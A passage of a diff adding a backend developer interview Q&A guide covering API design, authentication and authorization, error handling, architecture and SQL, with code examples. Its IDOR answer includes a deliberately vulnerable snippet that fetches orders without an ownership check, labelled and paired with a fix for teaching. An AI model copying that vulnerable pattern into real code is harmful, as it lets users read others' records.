+PATCH /users/42 {"name":"Asha K"}                       → email and phone kept
+```
+
+### Q4. Which status codes should you know and when do you use them?
+**Answer:**
+| Code | When |
+|---|---|
+| 200 OK | successful GET/PUT/PATCH |
+| 201 Created | resource created (add `Location` header) |
+| 202 Accepted | accepted for async processing |
+| 204 No Content | success, no body (DELETE) |
+| 301/302 | redirect permanent/temporary |
+| 304 Not Modified | cached version still valid |
+| 400 Bad Request | malformed/invalid input |
+| 401 Unauthorized | not authenticated (no/invalid token) |
+| 403 Forbidden | authenticated but not allowed |
+| 404 Not Found | resource doesn't exist |
+| 405 Method Not Allowed | wrong method on route |
+| 409 Conflict | duplicate, version conflict, invalid state change |
+| 413 Payload Too Large | body too big |
+| 422 Unprocessable Entity | valid format but business validation failed |
+| 429 Too Many Requests | rate limited (`Retry-After`) |
+| 500 Internal Server Error | unexpected server bug |
+| 502 Bad Gateway | upstream returned an invalid response |
+| 503 Service Unavailable | overloaded or down for maintenance |
+| 504 Gateway Timeout | upstream too slow |
+
+**Example:** Registering with an email that already exists → `409 Conflict`. Cancelling an order that has shipped → `409 Conflict` (or `422`).
+
+### Q5. 401 vs 403?
+**Answer:** **401** = "I don't know who you are" (missing, invalid or expired credentials — log in again). **403** = "I know who you are, but you may not do this" (wrong role or not the owner).
+
+**Example:** No token on `GET /admin/reports` → 401. A normal user's valid token on the same route → 403.
+
+### Q6. How do you design good URLs?
+**Answer:** Use plural nouns, lowercase, hyphens, no verbs; nest at most one level; use query params for filtering, sorting and pagination. For actions that don't fit CRUD, use a sub-resource.
+
+**Example:**
+```
+✅ GET  /v1/orders?status=paid&sort=-createdAt&limit=20
+✅ POST /v1/orders/981/cancel        (action as sub-resource)
+✅ GET  /v1/users/42/orders
+❌ GET  /v1/getAllOrders
+❌ POST /v1/orders/delete/981
+❌ GET  /v1/users/42/orders/981/items/5/reviews   (too deep)
+```
+
+### Q7. Offset pagination vs cursor pagination?
+**Answer:**
+- **Offset** (`?page=3&limit=20` → `OFFSET 40`): simple, supports jumping to a page. But slow on deep pages (DB still scans skipped rows) and items shift if rows are inserted while paging.
+- **Cursor / keyset** (`?cursor=<last id or timestamp>`): fast at any depth because it uses an index (`WHERE id < cursor`), stable with inserts. Can't jump to page 50. Best for feeds and infinite scroll.
+
+**Example:**
+```sql
+-- Offset
+SELECT * FROM orders ORDER BY id DESC LIMIT 20 OFFSET 40;
+
+-- Cursor
+SELECT * FROM orders WHERE id < 9810 ORDER BY id DESC LIMIT 20;
+```
+```json
+{ "data": [ ... ], "nextCursor": "9790", "hasMore": true }
+```
+
+### Q8. How do you version an API?
+**Answer:** Version when you make **breaking changes** (removing/renaming fields, changing types or behaviour). Adding optional fields is not breaking. Options: URL path `/v1/` (most common, visible, easy to route), header (`Accept: application/vnd.shop.v2+json`), or query param. Support the old version for a deprecation period and announce it (`Deprecation`/`Sunset` headers).
+
+**Example:**
+```js
+app.use('/v1/orders', ordersV1Router);
+app.use('/v2/orders', ordersV2Router); // v2 returns amount in paise instead of rupees
+```
+
+### Q9. What should an error response look like?
+**Answer:** Consistent across all endpoints: a machine-readable code, a human message, optional field details, and a request id to search logs. Never expose stack traces or SQL.
+
+**Example:**
+```json
+{
+  "error": {
+    "code": "VALIDATION_ERROR",
+    "message": "Request validation failed",
+    "details": [
+      { "field": "email", "issue": "must be a valid email" },
+      { "field": "items[0].qty", "issue": "must be greater than 0" }
+    ],
+    "requestId": "req_7f3a9c"
+  }
+}
+```
+
+### Q10. What is idempotency and how do you make POST idempotent?
+**Answer:** If a client retries a POST after a timeout, it may create duplicates (two payments). Solution: the client sends a unique `Idempotency-Key` header. The server stores the key with the result; repeats with the same key return the saved response instead of running again.
+
+**Example:**
+```ts
+app.post('/v1/payments', async (req, res) => {
+  const key = req.header('Idempotency-Key');
+  if (!key) return res.status(400).json({ error: 'Idempotency-Key required' });
+
+  const saved = await redis.get(`idem:${key}`);
+  if (saved) return res.status(200).json(JSON.parse(saved));
+
+  const locked = await redis.set(`idem-lock:${key}`, '1', 'NX', 'EX', 30);
+  if (!locked) return res.status(409).json({ error: 'Request in progress' });
+
+  const payment = await paymentService.charge(req.body);
+  await redis.set(`idem:${key}`, JSON.stringify(payment), 'EX', 86400);
+  res.status(201).json(payment);
+});
+```
+
+### Q11. REST vs GraphQL vs gRPC?
+**Answer:**
+| | REST | GraphQL | gRPC |
+|---|---|---|---|
+| Format | JSON over HTTP | JSON, one endpoint, query language | Protobuf (binary) over HTTP/2 |
+| Strength | Simple, cacheable, universal | Client picks exact fields; no over/under-fetching | Very fast, strongly typed contracts, streaming |
+| Weakness | Over/under-fetching, many round trips | Caching harder, N+1 risk, complex | Not browser-friendly without proxy |
+| Best for | Public APIs, CRUD | Complex UIs, mobile apps | Internal service-to-service |
+
+**Example (GraphQL):**
+```graphql
+query { user(id: 42) { name orders(last: 3) { id total } } }
+```
+
+### Q12. What is OpenAPI / Swagger?
+**Answer:** OpenAPI is a standard YAML/JSON format describing an API's endpoints, parameters, request/response schemas and auth. Tools generate docs (Swagger UI), client SDKs, server stubs, and run contract tests from it. Design-first teams write the spec before code.
+
+**Example:**
+```yaml
+paths:
+  /v1/users/{id}:
+    get:
+      parameters:
+        - in: path
+          name: id
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/User' }
+        '404': { description: Not found }
+```
+
+### Q13. How do you build a reliable integration with a third-party API?
+**Answer:**
+1. **Timeouts** on every call (never wait forever).
+2. **Retries** with exponential backoff + jitter, only for transient errors (timeouts, 429, 5xx) and only for idempotent calls.
+3. **Circuit breaker** so a dead provider doesn't hang your system.
+4. Respect their **rate limits**.
+5. Validate their responses (treat as untrusted).
+6. Log request/response metadata (not secrets) with a correlation id.
+7. Wrap the provider behind your own interface (adapter) so you can switch providers.
+8. Do slow calls asynchronously via a queue.
+
+**Example:**
+```ts
+async function callWithRetry<T>(fn: () => Promise<T>, retries = 3): Promise<T> {
+  for (let attempt = 0; ; attempt++) {
+    try {
+      return await fn();
+    } catch (err: any) {
+      const transient = err.code === 'ETIMEDOUT' || err.status === 429 || err.status >= 500;
+      if (!transient || attempt >= retries) throw err;
+      const delay = 2 ** attempt * 200 + Math.random() * 100; // 200, 400, 800 ms + jitter
+      await new Promise(r => setTimeout(r, delay));
+    }
+  }
+}
+
+const res = await callWithRetry(() =>
+  axios.get('https://api.provider.com/rates', { timeout: 3000 })
+);
+```
+
+### Q14. How do you handle incoming webhooks safely?
+**Answer:** Verify the **signature** (HMAC with a shared secret) to be sure it came from the provider; check the timestamp to block replays; respond `200` quickly; process the event asynchronously in a queue; **deduplicate** by event id because providers retry and send duplicates.
+
+**Example:**
+```ts
+import crypto from 'crypto';
+
+app.post('/webhooks/payments', express.raw({ type: 'application/json' }), async (req, res) => {
+  const signature = req.header('X-Signature') ?? '';
+  const expected = crypto.createHmac('sha256', WEBHOOK_SECRET).update(req.body).digest('hex');
+  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) {
+    return res.status(401).send('Invalid signature');
+  }
+  const event = JSON.parse(req.body.toString());
+  const isNew = await redis.set(`webhook:${event.id}`, '1', 'NX', 'EX', 86400 * 3);
+  if (isNew) await queue.add('payment-event', event);
+  res.sendStatus(200);
+});
+```
+
+### Q15. Polling vs webhooks?
+**Answer:** **Polling**: your system asks the provider repeatedly "anything new?" — simple but wasteful and delayed. **Webhooks**: the provider calls your URL when something happens — real-time and efficient, but your endpoint must be public, secure and reliable. Many systems use webhooks plus a periodic polling job as a safety net for missed events.
+
+**Example:** Payment status — receive the `payment.succeeded` webhook; a nightly job also polls payments stuck in `pending` for more than 1 hour.
+
+---
+
+## 6. Authentication and Authorization
+
+### Q1. Authentication vs authorization?
+**Answer:** **Authentication (AuthN)** verifies identity — "who are you?" (password, OTP, token, SSO). **Authorization (AuthZ)** decides permissions — "what are you allowed to do?" (roles, ownership, policies). AuthN always comes first.
+
+**Example:** Logging in with email + password = authentication. Being allowed to delete only your own orders = authorization.
+
+### Q2. How should passwords be stored?
+**Answer:** Never in plain text or with fast hashes like MD5/SHA-256 (attackers can try billions per second). Use a slow, salted, adaptive algorithm: **bcrypt**, **scrypt** or **Argon2id**. A salt (random per password) means identical passwords produce different hashes and blocks rainbow tables.
+
+**Example:**
+```ts
+import bcrypt from 'bcrypt';
+
+const hash = await bcrypt.hash(plainPassword, 12);         // on signup
+const ok = await bcrypt.compare(plainPassword, user.hash); // on login
+if (!ok) throw new AppError(401, 'INVALID_CREDENTIALS', 'Invalid email or password');
+// Same message for "no user" and "wrong password" to avoid user enumeration
+```
+
+### Q3. Session-based auth vs token-based (JWT) auth?
+**Answer:**
+| | Sessions | JWT |
+|---|---|---|
+| State | Stored on server (Redis/DB); cookie holds session id | Self-contained in signed token |
+| Revocation | Easy — delete session | Hard — valid until expiry |
+| Scaling | Needs shared session store | Any server can verify with key |
+| Size | Small cookie | Larger token on every request |
+| Good for | Traditional web apps | APIs, mobile, microservices |
+
+**Example (session):**
+```ts
+app.use(session({
+  store: new RedisStore({ client: redis }),
+  secret: env.SESSION_SECRET,
+  cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 86400000 },
+}));
+```
+
+### Q4. What is a JWT and how is it structured?
+**Answer:** JSON Web Token = `header.payload.signature`, each part Base64URL-encoded.
+- **Header**: algorithm and type (`{"alg":"RS256","typ":"JWT"}`).
+- **Payload**: claims — `sub` (user id), `exp` (expiry), `iat` (issued at), `iss` (issuer), `aud` (audience), custom like `role`.
+- **Signature**: proves the token wasn't changed.
+
+The payload is **only encoded, not encrypted** — anyone can read it. Never put passwords or secrets in it.
+
+**Example:**
+```ts
+import jwt from 'jsonwebtoken';
+const accessToken = jwt.sign(
+  { sub: user.id, role: user.role },
+  PRIVATE_KEY,
+  { algorithm: 'RS256', expiresIn: '15m', issuer: 'shop-api', audience: 'shop-app' }
+);
+
+const payload = jwt.verify(token, PUBLIC_KEY, {
+  algorithms: ['RS256'],  // pin the algorithm; never allow "none"
+  issuer: 'shop-api',
+  audience: 'shop-app',
+});
+```
+
+### Q5. HS256 vs RS256?
+**Answer:** **HS256** uses one shared secret to sign and verify — every service that verifies also could create tokens. **RS256/ES256** use a private key to sign (only the auth service has it) and a public key to verify (shared freely, often via a JWKS endpoint). Use RS256/ES256 when multiple services verify tokens.
+
+**Example:** Auth service signs with `private.pem`; Orders and Payments services fetch `https://auth.shop.com/.well-known/jwks.json` and verify with the public key.
+
+### Q6. Explain the access token + refresh token pattern.
+**Answer:** The **access token** is short-lived (5–15 min) and sent with every API call; if stolen, it expires quickly. The **refresh token** is long-lived (days), sent only to `/auth/refresh` to get a new access token, stored securely (HttpOnly cookie) and saved hashed in the DB so it can be revoked. **Rotation**: each refresh issues a new refresh token and invalidates the old one; if an old one is reused, assume theft and revoke the whole session.
+
+**Example:**
+```ts
+app.post('/v1/auth/refresh', async (req, res) => {
+  const token = req.cookies.refresh_token;
+  const stored = await db.refreshTokens.findByHash(sha256(token));
+  if (!stored || stored.expiresAt < new Date()) return res.sendStatus(401);
+  if (stored.usedAt) {                         // reuse detected
+    await db.refreshTokens.revokeFamily(stored.familyId);
+    return res.sendStatus(401);
+  }
+  await db.refreshTokens.markUsed(stored.id);
+  const newRefresh = crypto.randomBytes(48).toString('hex');
+  await db.refreshTokens.create({ hash: sha256(newRefresh), userId: stored.userId, familyId: stored.familyId });
+  res.cookie('refresh_token', newRefresh, { httpOnly: true, secure: true, sameSite: 'strict', path: '/v1/auth/refresh' });
+  res.json({ accessToken: signAccess(stored.userId) });
+});
+```
+
+### Q7. How do you log out a user who uses JWTs?
+**Answer:** A JWT stays valid until it expires. Options: keep access tokens short-lived and **revoke the refresh token** on logout (most common); keep a **denylist** of token ids (`jti`) in Redis until their expiry; or store a `tokenVersion` on the user and increment it to invalidate all tokens.
+
+**Example:**
+```ts
+// logout: revoke refresh token + denylist current access token for its remaining life
+await db.refreshTokens.revoke(userId);
+const ttl = payload.exp - Math.floor(Date.now() / 1000);
+await redis.set(`denylist:${payload.jti}`, '1', 'EX', ttl);
+```
+
+### Q8. Where should a browser app store tokens?
+**Answer:**
+- **localStorage**: easy, but any XSS can steal the token. Avoid for long-lived tokens.
+- **HttpOnly cookie**: JavaScript can't read it (safe from XSS theft) but the browser sends it automatically, so you need CSRF protection (`SameSite`, CSRF token).
+- **In memory** (JS variable): safe from XSS persistence, lost on refresh.
+
+Common pattern: access token in memory, refresh token in an `HttpOnly; Secure; SameSite=Strict` cookie.
+
+### Q9. What is OAuth 2.0? How is it different from OpenID Connect?
+**Answer:** **OAuth 2.0** is a framework for **delegated authorization**: a user lets an app access their data on another service without sharing their password (e.g. "allow this app to read your Google Calendar"). **OpenID Connect (OIDC)** is a layer on top of OAuth 2.0 for **authentication**: it adds an **ID token** (a JWT about the user) and a `/userinfo` endpoint — this powers "Sign in with Google".
+
+Roles: **Resource owner** (user), **Client** (your app), **Authorization server** (Google login), **Resource server** (Google Calendar API).
+
+### Q10. Explain the Authorization Code flow with PKCE.
+**Answer:** The recommended flow for web, mobile and single-page apps:
+1. App creates a random `code_verifier` and its SHA-256 hash `code_challenge`.
+2. App redirects user to the auth server with `client_id`, `redirect_uri`, `scope`, `state`, `code_challenge`.
+3. User logs in and consents.
+4. Auth server redirects back to `redirect_uri` with a short-lived `code` (and the same `state`).
+5. App sends `code` + `code_verifier` to the token endpoint.
+6. Auth server checks the verifier matches the challenge and returns access token (+ refresh token, + ID token for OIDC).
+7. App calls the API with the access token.
+
+PKCE stops an attacker who intercepts the `code` from exchanging it. `state` protects against CSRF.
+
+**Example:**
+```
+GET https://accounts.google.com/o/oauth2/v2/auth
+  ?response_type=code
+  &client_id=abc.apps.googleusercontent.com
+  &redirect_uri=https://shop.com/auth/callback
+  &scope=openid%20email%20profile
+  &state=xyz123
+  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
+  &code_challenge_method=S256
+```
+
+### Q11. Which OAuth flow do you use for service-to-service calls?
+**Answer:** **Client Credentials** flow: no user involved; the service authenticates with its own `client_id` + `client_secret` (or a signed JWT/mTLS) and receives an access token. The Implicit and Resource Owner Password flows are deprecated.
+
+**Example:**
+```bash
+curl -X POST https://auth.shop.com/oauth/token \
+  -d grant_type=client_credentials \
+  -d client_id=billing-service \
+  -d client_secret=$SECRET \
+  -d scope=orders:read
+```
+
+### Q12. What is RBAC and how do you implement it?
+**Answer:** **Role-Based Access Control**: users get roles, roles have permissions. Code checks **permissions** (not role names), so adding a new role doesn't require code changes. Typical tables: `users`, `roles`, `permissions`, `user_roles`, `role_permissions`.
+
+**Example:**
+```ts
+const ROLE_PERMISSIONS: Record<string, string[]> = {
+  customer: ['orders:create', 'orders:read:own'],
+  support:  ['orders:read:any', 'orders:update:any'],
+  admin:    ['orders:read:any', 'orders:update:any', 'orders:delete', 'users:manage'],
+};
+
+const requirePermission = (perm: string) => (req, res, next) => {
+  const perms = ROLE_PERMISSIONS[req.user.role] ?? [];
+  return perms.includes(perm) ? next() : res.status(403).json({ error: 'Forbidden' });
+};
+
+router.delete('/orders/:id', requireAuth, requirePermission('orders:delete'), deleteOrder);
+```
+
+### Q13. RBAC vs ABAC?
+**Answer:** **RBAC** decides by role ("admins can edit orders"). **ABAC** (Attribute-Based) decides by attributes of the user, resource and environment ("a manager can approve orders from their own region under ₹1,00,000 during business hours"). ABAC is more flexible but more complex; many systems combine RBAC with ownership/attribute checks.
+
+**Example:**
+```ts
+function canApprove(user, order) {
+  return user.role === 'manager'
+    && user.region === order.region
+    && order.total < 100000;
+}
+```
+
+### Q14. What is IDOR (Broken Object Level Authorization)?
+**Answer:** Insecure Direct Object Reference: the API checks that the user is logged in but not that **this specific record belongs to them**. An attacker changes the id in the URL and reads other people's data. It is #1 in the OWASP API Top 10.
+
+**Example:**
+```ts
+// ❌ Vulnerable: any logged-in user can read any order
+const order = await db.orders.findById(req.params.id);
+
+// ✅ Fixed: scope the query to the owner (or check role)
+const order = await db.orders.findOne({ id: req.params.id, userId: req.user.id });
+if (!order) return res.status(404).json({ error: 'Order not found' }); // 404 hides existence
+```
+
+### Q15. How do API keys differ from tokens and how should they be stored?
+**Answer:** API keys identify a client application (often server-to-server), are long-lived and usually have no user context. Store only a **hash** of the key in the DB (like a password), show the full key once at creation, allow rotation and revocation, give each key limited scopes, and rate-limit per key.
+
+**Example:**
+```ts
+const rawKey = 'sk_live_' + crypto.randomBytes(24).toString('hex');
+await db.apiKeys.create({ prefix: rawKey.slice(0, 12), hash: sha256(rawKey), scopes: ['orders:read'] });
+// Return rawKey once; afterwards only the prefix is shown in the dashboard
+```
+
+### Q16. What is MFA and SSO?
+**Answer:** **MFA** (multi-factor authentication) requires two or more of: something you know (password), have (phone/TOTP app/security key), are (biometrics). **TOTP** generates a 6-digit code from a shared secret and the current time. **SSO** (Single Sign-On) lets users log into many apps with one identity provider, using OIDC or SAML (common in enterprises, e.g. Okta, Azure AD).
+
+**Example:**
+```ts
+import { authenticator } from 'otplib';
+const secret = authenticator.generateSecret();                 // store per user (encrypted)
+const valid = authenticator.verify({ token: req.body.code, secret });
+```
+
+---
+
+## 7. Error Handling and Backend Architecture
+
+### Q1. How do you structure a backend application?
+**Answer:** Use **layers** with one responsibility each:
+- **Routes/Controllers**: HTTP only — parse, validate, call service, send response.
+- **Services**: business logic and rules, transactions.
+- **Repositories**: database queries only.
+- **Models/DTOs**: data shapes in and out.
+
+Organise by **feature/module** (orders, users, payments), not by technical type, so related code lives together.
+
+**Example:**
+```
+src/
+  modules/
+    orders/
+      order.routes.ts
+      order.controller.ts
+      order.service.ts
+      order.repository.ts
+      order.schema.ts
+      order.service.test.ts
+  middleware/  auth.ts, errorHandler.ts, requestId.ts, rateLimit.ts
+  lib/         db.ts, redis.ts, logger.ts
+  config/      env.ts
+  app.ts
+  server.ts
+```
+
+### Q2. Show a controller, service and repository working together.
+**Answer:** The controller knows HTTP, the service knows the business rule, the repository knows SQL.
+
+**Example:**
+```ts
+// order.controller.ts
+export const cancelOrder = async (req: Request, res: Response) => {
+  const order = await orderService.cancel(req.params.id, req.user!);
+  res.json(order);
+};
+
+// order.service.ts
+export const orderService = {
+  async cancel(orderId: string, user: AuthUser) {
+    const order = await orderRepo.findById(orderId);
+    if (!order) throw NotFound('Order');
+    if (order.userId !== user.id && user.role !== 'admin') throw Forbidden();
+    if (order.status !== 'pending') throw new AppError(409, 'INVALID_STATE', 'Only pending orders can be cancelled');
+    return orderRepo.updateStatus(orderId, 'cancelled');
+  },
+};
+
+// order.repository.ts
+export const orderRepo = {
+  findById: (id: string) => db.query('SELECT * FROM orders WHERE id = $1', [id]).then(r => r.rows[0]),
+  updateStatus: (id: string, status: string) =>
+    db.query('UPDATE orders SET status=$2, updated_at=now() WHERE id=$1 RETURNING *', [id, status]).then(r => r.rows[0]),
+};
+```
+
+### Q3. What is dependency injection and why use it?
+**Answer:** Instead of a class creating its own dependencies, they are **passed in**. This makes code loosely coupled and easy to test (pass a fake repository in tests). Frameworks like NestJS do it automatically; in plain Node, pass dependencies through constructors or factory functions.
+
+**Example:**
+```ts
+class OrderService {
+  constructor(private repo: OrderRepo, private mailer: Mailer) {}
+  async place(dto: CreateOrder) {
+    const order = await this.repo.create(dto);
+    await this.mailer.sendOrderConfirmation(order);
+    return order;
+  }
+}
+
+// production
+const service = new OrderService(new PgOrderRepo(db), new SesMailer());
+// test
+const service2 = new OrderService(fakeRepo, { sendOrderConfirmation: vi.fn() });
+```
+
+### Q4. Explain SOLID briefly.
+**Answer:**
+- **S**ingle responsibility: one reason to change per module.
+- **O**pen/closed: extend behaviour without editing existing code (e.g. add a new payment provider class).
+- **L**iskov substitution: subtypes must work wherever the parent is expected.
+- **I**nterface segregation: small, focused interfaces.
+- **D**ependency inversion: depend on abstractions (interfaces), not concrete classes.
+
+**Example (Open/closed + Dependency inversion):**
+```ts
+interface PaymentProvider { charge(amount: number, token: string): Promise<string>; }
+class RazorpayProvider implements PaymentProvider { /* ... */ }
+class StripeProvider implements PaymentProvider { /* ... */ }
+// CheckoutService depends on PaymentProvider; adding PayPal needs no change to CheckoutService
+```
+
+### Q5. What are Clean / Hexagonal architecture?
+**Answer:** Both put **business logic at the centre** with no dependency on frameworks, databases or HTTP. Outer layers (adapters) translate between the core and the outside world through **ports** (interfaces). You can swap Express for Fastify or Postgres for Mongo without touching business rules. For small services a simple layered architecture is usually enough.
+
+**Example:** `domain/Order.ts` (pure rules) ← `application/PlaceOrder.ts` (use case, depends on `OrderRepository` interface) ← `infrastructure/PgOrderRepository.ts` and `http/orderController.ts` (adapters).
+
+### Q6. What is a modular monolith?
+**Answer:** One deployable application split into modules with strict boundaries (each module owns its tables and exposes a public interface). It gives most of the organisational benefits of microservices without network calls and distributed transactions. It's the recommended starting point; a well-bounded module can later be extracted into a service.
+
+### Q7. Operational errors vs programmer errors?
+**Answer:**
+- **Operational**: expected runtime problems — invalid input, record not found, duplicate, third-party timeout, DB connection lost. Handle them: return a proper 4xx, retry, or degrade gracefully.
+- **Programmer**: bugs — reading a property of `undefined`, wrong argument type. Log them, return 500, fix the code. If the process may be in a corrupt state, crash and let the process manager restart it.
+
+### Q8. How do you implement centralized error handling in Express?
+**Answer:** Throw typed errors from anywhere; one error middleware converts them into consistent responses and logs unexpected ones.
+
+**Example:**
+```ts
+export class AppError extends Error {
+  constructor(public status: number, public code: string, message: string, public details?: unknown) {
+    super(message);
+    this.name = 'AppError';
+  }
+}
+export const NotFound = (what: string) => new AppError(404, 'NOT_FOUND', `${what} not found`);
+export const Forbidden = () => new AppError(403, 'FORBIDDEN', 'You cannot perform this action');
+
+export function errorHandler(err: unknown, req: Request, res: Response, _next: NextFunction) {
+  if (err instanceof ZodError) {
+    return res.status(400).json({ error: { code: 'VALIDATION_ERROR', message: 'Invalid input', details: err.issues, requestId: req.id } });
+  }
+  if (err instanceof AppError) {
+    return res.status(err.status).json({ error: { code: err.code, message: err.message, details: err.details, requestId: req.id } });
+  }
+  if ((err as any)?.code === '23505') { // Postgres unique violation
+    return res.status(409).json({ error: { code: 'CONFLICT', message: 'Resource already exists', requestId: req.id } });
+  }
+  logger.error({ err, requestId: req.id, path: req.path }, 'Unhandled error');
+  res.status(500).json({ error: { code: 'INTERNAL', message: 'Something went wrong', requestId: req.id } });
+}
+```
+
+### Q9. How do you handle errors from async route handlers in Express 4?
+**Answer:** Express 4 does not catch rejected promises, so an `await` that throws causes an unhandled rejection and the request hangs. Wrap handlers, use the `express-async-errors` package, or upgrade to Express 5 (which forwards rejected promises to error middleware automatically).
+
+**Example:**
+```ts
+const asyncHandler = (fn: RequestHandler): RequestHandler =>
+  (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
+
+router.get('/orders/:id', asyncHandler(async (req, res) => {
+  res.json(await orderService.get(req.params.id));
+}));
+```
+
+### Q10. Where should validation happen?
+**Answer:** At three levels:
+1. **Edge (controller)**: shape and format of input with a schema (types, required fields, lengths, formats).
+2. **Service**: business rules (stock available, order cancellable, user owns resource).
+3. **Database**: integrity as the last line of defence (`NOT NULL`, `UNIQUE`, `CHECK`, foreign keys).
+
+**Example:**
+```ts
+const validate = (schema: ZodSchema) => (req, _res, next) => {
+  req.body = schema.parse(req.body); // throws ZodError → errorHandler returns 400
+  next();
+};
+router.post('/orders', requireAuth, validate(CreateOrder), asyncHandler(createOrder));
+```
+
+### Q11. What makes good logging?
+**Answer:** **Structured JSON** logs (searchable), correct **levels** (`error`, `warn`, `info`, `debug`), a **request/trace id** on every line, context (user id, route, duration), and **no sensitive data** (passwords, tokens, card numbers, full personal data). Use pino or winston in Node, `slog` or zap in Go.
+
+**Example:**
+```ts
+import pino from 'pino';
+export const logger = pino({ redact: ['req.headers.authorization', '*.password'] });
+
+app.use((req, res, next) => {
+  req.id = req.header('X-Request-Id') ?? crypto.randomUUID();
+  res.setHeader('X-Request-Id', req.id);
+  req.log = logger.child({ requestId: req.id });
+  next();
+});
+
+req.log.info({ orderId, userId: req.user.id }, 'Order placed');
+// {"level":30,"time":...,"requestId":"9f1c...","orderId":"981","userId":"42","msg":"Order placed"}
+```
+
+### Q12. Should you ever crash the process on errors?
+**Answer:** Yes, for unknown programmer errors (`uncaughtException`) the process may be in a broken state, so log and exit; a process manager (PM2, Docker restart policy, Kubernetes) restarts it. Never crash for operational errors like a bad request.
+
+**Example:**
+```ts
+process.on('unhandledRejection', (reason) => {
+  logger.fatal({ reason }, 'Unhandled rejection');
+  process.exit(1);
+});
+process.on('uncaughtException', (err) => {
+  logger.fatal({ err }, 'Uncaught exception');
+  process.exit(1);
+});
+```
+
+### Q13. What is a DTO and why not return database rows directly?
+**Answer:** A **Data Transfer Object** defines exactly what goes in or out of the API. Returning raw DB rows leaks internal fields (`password_hash`, `internal_notes`), ties the API contract to the DB schema, and makes schema changes break clients.
+
+**Example:**
+```ts
+function toUserResponse(row: UserRow) {
+  return { id: row.id, name: row.name, email: row.email, joinedAt: row.created_at };
+}
+res.json(toUserResponse(row)); // password_hash never leaves the server
+```
+
+---
+
+## 8. SQL Databases
+
+> Sample schema used in the examples:
+> ```sql
+> users(id, name, email, city, created_at)
+> products(id, name, price, category)
+> orders(id, user_id, status, total, created_at)
+> order_items(id, order_id, product_id, qty, price)
+> employees(id, name, manager_id, department, salary)
+> ```
+
+### Q1. What is a primary key, foreign key and unique key?
+**Answer:**
+- **Primary key**: uniquely identifies each row; not null; one per table.
+- **Foreign key**: a column referencing another table's primary key; enforces that the referenced row exists.
+- **Unique key**: values must be unique but it's not the row's identity (e.g. email). Can have several per table.
+
+**Example:**
+```sql
+CREATE TABLE users (
+  id BIGSERIAL PRIMARY KEY,
+  email TEXT NOT NULL UNIQUE,
+  name TEXT NOT NULL,
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+
+CREATE TABLE orders (
+  id BIGSERIAL PRIMARY KEY,
+  user_id BIGINT NOT NULL REFERENCES users(id) ON DELETE RESTRICT,
+  status TEXT NOT NULL CHECK (status IN ('pending','paid','shipped','cancelled')),
+  total NUMERIC(12,2) NOT NULL CHECK (total >= 0),
+  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+```
+
+### Q2. Explain normalization (1NF, 2NF, 3NF).
+**Answer:** Normalization removes duplicate data so each fact is stored once, preventing update anomalies.
+- **1NF**: atomic values, no repeating groups or lists in a column.
+- **2NF**: 1NF + every non-key column depends on the **whole** primary key (matters for composite keys).
+- **3NF**: 2NF + no non-key column depends on another non-key column (no transitive dependency).
+
+**Example:**
+```
+❌ orders(id, customer_name, customer_email, products="pen,book", city, city_pincode)
+   - products is a list (breaks 1NF)
+   - customer_email depends on customer, not order (duplication)
+   - city_pincode depends on city (transitive, breaks 3NF)
+
+✅ users(id, name, email, city_id)
+✅ cities(id, name, pincode)
+✅ orders(id, user_id, created_at)
+✅ order_items(order_id, product_id, qty, price)
+```
+
+### Q3. When would you denormalize?
+**Answer:** When read performance matters more than write simplicity — e.g. storing `orders.total` instead of summing items every time, or keeping `posts.comment_count`. The cost: you must keep the copy in sync (in a transaction, trigger, or event handler).
+
+**Example:**
+```sql
+BEGIN;
+INSERT INTO comments (post_id, user_id, body) VALUES (7, 42, 'Nice!');
+UPDATE posts SET comment_count = comment_count + 1 WHERE id = 7;
+COMMIT;
+```
+
+### Q4. How do you model one-to-many and many-to-many relationships?
+**Answer:** **One-to-many**: put a foreign key on the "many" side (`orders.user_id`). **Many-to-many**: create a junction table with two foreign keys (and often extra fields).
+
+**Example:**
+```sql
+-- Many-to-many: students and courses
+CREATE TABLE enrollments (
+  student_id BIGINT REFERENCES students(id),
+  course_id  BIGINT REFERENCES courses(id),
+  enrolled_at TIMESTAMPTZ DEFAULT now(),
+  grade TEXT,
+  PRIMARY KEY (student_id, course_id)
+);
+```
+
+### Q5. Explain the different JOIN types.
+**Answer:**
+- **INNER JOIN**: only rows with a match in both tables.
+- **LEFT JOIN**: all rows from the left table; NULLs where there's no match on the right.
+- **RIGHT JOIN**: all rows from the right table (usually rewritten as LEFT).
+- **FULL OUTER JOIN**: all rows from both sides.
+- **CROSS JOIN**: every combination (cartesian product).
+- **SELF JOIN**: a table joined to itself.
+
+**Example:**
+```sql
+-- INNER: orders with their customer names
+SELECT o.id, u.name, o.total
+FROM orders o
+INNER JOIN users u ON u.id = o.user_id;
+
+-- LEFT: all users and their order count (including users with 0 orders)
+SELECT u.id, u.name, COUNT(o.id) AS order_count
+FROM users u
+LEFT JOIN orders o ON o.user_id = u.id
+GROUP BY u.id, u.name;
+
+-- Users who never ordered
+SELECT u.* FROM users u
+LEFT JOIN orders o ON o.user_id = u.id
+WHERE o.id IS NULL;
+
+-- SELF JOIN: employee with manager name
+SELECT e.name AS employee, m.name AS manager
+FROM employees e
+LEFT JOIN employees m ON m.id = e.manager_id;
+```
+
+### Q6. What is the logical order of SQL execution?
+**Answer:** `FROM` → `JOIN` → `WHERE` → `GROUP BY` → `HAVING` → `SELECT` → `DISTINCT` → `ORDER BY` → `LIMIT/OFFSET`. That's why `WHERE` can't use a `SELECT` alias or an aggregate, but `ORDER BY` can.
+
+**Example:**
+```sql
+SELECT user_id, SUM(total) AS revenue
+FROM orders
+WHERE status = 'paid'            -- filters rows before grouping
+GROUP BY user_id
+HAVING SUM(total) > 10000        -- filters groups after aggregation
+ORDER BY revenue DESC            -- alias allowed here
+LIMIT 10;
+```
+
+### Q7. WHERE vs HAVING?
+**Answer:** `WHERE` filters individual rows **before** grouping and can't use aggregates. `HAVING` filters **groups after** `GROUP BY` and can use aggregates.
+
+**Example:**
+```sql
+-- Cities with more than 100 users who joined this year
+SELECT city, COUNT(*) AS users
+FROM users
+WHERE created_at >= '2026-01-01'
